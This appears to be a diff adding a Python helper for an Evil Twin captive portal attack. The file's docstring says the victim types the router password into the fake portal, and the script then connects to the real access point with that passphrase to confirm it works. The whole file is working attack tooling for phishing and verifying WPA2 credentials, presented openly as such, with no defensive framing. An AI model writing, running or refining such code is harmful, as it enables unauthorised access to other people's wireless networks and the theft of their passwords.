@@ -1,0 +1,195 @@
+#!/usr/bin/env python3
+"""Validate a WPA2 passphrase against the real AP through wlan1.
+
+Used by the Evil Twin captive portal: the victim types the router password,
+this helper associates to the real BSSID with that PSK and reports whether
+the WPA2 4-way handshake completed.
+
+Result values:
+  ok          - the 4-way handshake completed (PSK is correct)
+  invalid     - the AP rejected the PSK (handshake failed / wrong key)
+  unreachable - the AP was not seen or association timed out (unknown)
+  error       - local failure (missing tools, interface busy, ...)
+
+Prints a single JSON object. Standard library only.
+"""
+
+import argparse
+import json
+import os
+import shutil
+import signal
+import subprocess
+import sys
+import time
+
+
+CTRL_DIR = '/run/pinapple-psk'
+LOG_FILE = '/run/pinapple-psk.log'
+CONF_FILE = '/run/pinapple-psk.conf'
+PID_FILE = '/run/pinapple-psk.pid'
+
+
+def run(cmd, timeout=8):
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        return r.returncode, (r.stdout or '').strip(), (r.stderr or '').strip()
+    except (OSError, subprocess.SubprocessError) as exc:
+        return 1, '', str(exc)
+
+
+def iface_mode(iface):
+    rc, out, _ = run(['iw', 'dev', iface, 'info'])
+    if rc != 0:
+        return 'missing'
+    for line in out.splitlines():
+        line = line.strip()
+        if line.startswith('type '):
+            return line.split(None, 1)[1]
+    return 'unknown'
+
+
+def set_mode(iface, mode):
+    run(['ip', 'link', 'set', iface, 'down'])
+    rc, _, err = run(['iw', 'dev', iface, 'set', 'type', mode])
+    run(['ip', 'link', 'set', iface, 'up'])
+    return rc == 0, err
+
+
+def clean(value):
+    return ''.join(c for c in str(value) if 32 <= ord(c) < 127)
+
+
+def read_log():
+    try:
+        with open(LOG_FILE, errors='ignore') as handle:
+            return handle.read()
+    except OSError:
+        return ''
+
+
+def wpa_state(iface):
+    rc, out, _ = run(['wpa_cli', '-i', iface, 'status'], timeout=4)
+    if rc != 0:
+        return ''
+    for line in out.splitlines():
+        if line.startswith('wpa_state='):
+            return line.split('=', 1)[1].strip()
+    return ''
+
+
+def stop_supplicant(iface):
+    if shutil.which('wpa_cli'):
+        run(['wpa_cli', '-i', iface, 'terminate'], timeout=4)
+    try:
+        with open(PID_FILE) as handle:
+            pid = int(handle.read().strip())
+        os.kill(pid, signal.SIGTERM)
+    except (OSError, ValueError):
+        pass
+    time.sleep(0.3)
+
+
+def main():
+    ap = argparse.ArgumentParser(description='Validate a WPA2 PSK against an AP')
+    ap.add_argument('--iface', default='wlan1')
+    ap.add_argument('--ssid', required=True)
+    ap.add_argument('--bssid', default='')
+    ap.add_argument('--psk', required=True)
+    ap.add_argument('--timeout', type=float, default=20.0)
+    args = ap.parse_args()
+
+    iface = args.iface
+    ssid = clean(args.ssid)
+    bssid = clean(args.bssid).lower()
+    psk = clean(args.psk)
+    if not ssid or not psk:
+        print(json.dumps({'result': 'error', 'detail': 'ssid and psk are required'}))
+        return 2
+    if not shutil.which('wpa_supplicant'):
+        print(json.dumps({'result': 'error',
+                          'detail': 'wpa_supplicant is not installed (apt install wpasupplicant)'}))
+        return 2
+    original_mode = iface_mode(iface)
+    if original_mode == 'missing':
+        print(json.dumps({'result': 'error', 'detail': '%s is not present' % iface}))
+        return 2
+
+    result = 'unreachable'
+    detail = 'the AP never completed the handshake'
+    started = time.time()
+
+    try:
+        stop_supplicant(iface)
+        ok, err = set_mode(iface, 'managed')
+        if not ok:
+            print(json.dumps({'result': 'error',
+                              'detail': 'could not switch %s to managed: %s' % (iface, err)}))
+            return 1
+
+        try:
+            os.makedirs(CTRL_DIR, exist_ok=True)
+        except OSError:
+            pass
+        with open(CONF_FILE, 'w') as handle:
+            handle.write('ctrl_interface=%s\nap_scan=1\n' % CTRL_DIR)
+            handle.write('network={\n')
+            handle.write('\tssid="%s"\n' % ssid.replace('"', ''))
+            if bssid:
+                handle.write('\tbssid=%s\n' % bssid)
+            handle.write('\tpsk="%s"\n' % psk.replace('"', ''))
+            handle.write('\tkey_mgmt=WPA-PSK\n\tpairwise=CCMP\n\tscan_ssid=1\n}\n')
+        try:
+            os.remove(LOG_FILE)
+        except OSError:
+            pass
+
+        proc = subprocess.Popen(
+            ['wpa_supplicant', '-i', iface, '-c', CONF_FILE,
+             '-P', PID_FILE, '-f', LOG_FILE],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            start_new_session=True)
+
+        saw_handshake = False
+        deadline = time.time() + args.timeout
+        while time.time() < deadline:
+            time.sleep(0.4)
+            if proc.poll() is not None:
+                detail = 'wpa_supplicant exited early'
+                break
+            log = read_log()
+            state = wpa_state(iface)
+            if 'CTRL-EVENT-CONNECTED' in log:
+                result, detail = 'ok', 'the 4-way handshake completed'
+                break
+            if ('4-Way Handshake failed' in log or
+                    'pre-shared key may be incorrect' in log or
+                    'CTRL-EVENT-AUTH-REJECT' in log):
+                result, detail = 'invalid', 'the AP rejected the passphrase'
+                break
+            if state in ('ASSOCIATING', 'ASSOCIATED', '4WAY_HANDSHAKE'):
+                saw_handshake = True
+        else:
+            detail = ('association timed out after %.0fs' % args.timeout) if not saw_handshake \
+                else 'the AP never answered the handshake'
+
+    finally:
+        stop_supplicant(iface)
+        try:
+            os.remove(CONF_FILE)
+        except OSError:
+            pass
+        # Put the radio back the way we found it.
+        if original_mode in ('monitor', 'managed', 'AP'):
+            set_mode(iface, original_mode)
+        else:
+            set_mode(iface, 'managed')
+
+    print(json.dumps({'result': result, 'detail': detail,
+                      'ssid': ssid, 'bssid': bssid,
+                      'elapsed': round(time.time() - started, 1)}))
+    return 0 if result == 'ok' else 1
+
+
+if __name__ == '__main__':
+    sys.exit(main())
